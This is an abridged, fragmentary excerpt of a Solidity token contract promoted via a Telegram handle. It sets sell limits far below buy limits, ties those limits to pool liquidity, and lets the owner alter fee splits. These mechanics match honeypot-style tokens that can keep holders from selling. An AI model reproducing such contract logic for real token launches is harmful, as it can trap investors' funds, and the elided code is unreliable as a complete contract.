...
NEVER FALL INTO A FAKE PROJECT.
THE TRUE PROJECT OF MINE IS ALWAYS LED BY MYSELF, @GOOGLEFALSE.
...
contract GOOGLEFALSEDEBUT is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7C3002d4a7BDE4ACBf0d45dcb45806A715554f20); 
    address payable public Wallet_Dev = payable(0xfeB92608b6567DC7dD8457882E983AF1C2B342F3);
    ...
    string private constant _symbol = "GF DEBUT"; 
    ...
    uint256 public Percent_Marketing = 78;
    ...
    uint256 private _previousMaxWalletToken = _tTotal * 100 / 100;

    uint256 public _maxTxAmount = _tTotal * 25 / 1000; 
    uint256 public _maxSellTxAmount = _tTotal * 1 / 1000;
    uint256 private _previousMaxTxAmount = _tTotal * 100 / 100;
    ...
    constructor () {
        ...
        _owner = 0xfeB92608b6567DC7dD8457882E983AF1C2B342F3;
    ...
    //change public to private for live
    function checkLP() public view returns(uint256) {

        uint256 LPBal = balanceOf(uniswapV2Pair);
        uint256 TS = _tTotal;
        uint256 percent = 100 * LPBal / TS;
        uint256 percentMax;
        if(percent <= 100 && percent >= 90){
            percentMax = 400;
        }
        if(percent <= 89 && percent >= 70){
            percentMax = 300;
        }
        if(percent <= 69 && percent >= 50){
            percentMax = 200;
        }
        if(percent <= 49 && percent >= 30){
            percentMax = 100;
        }
        if(percent <= 29 && percent >= 10 ){
            percentMax = 80;
        }
        if(percent <= 9 && percent >= 7 ){
            percentMax = 70;
        }
        if(percent <= 6 && percent >= 2 ){
            percentMax = 10;
        }
        if(percent <= 1){
            percentMax = 5;
        ...
        //by telegram @googlefalse

        return percentMax;
    }

    function enableAntiDump() private {
        if(antiDump){
        uint256 maxTx = _tTotal * checkLP() / 10000;

        _maxSellTxAmount = maxTx;
        //by telegram @googlefalse
        }
    }
    ...
    function stopAutoBurn() public onlyOwner {
        antiDump = true;
        Percent_Burn = 0;
        Percent_Dev = 21;
    }
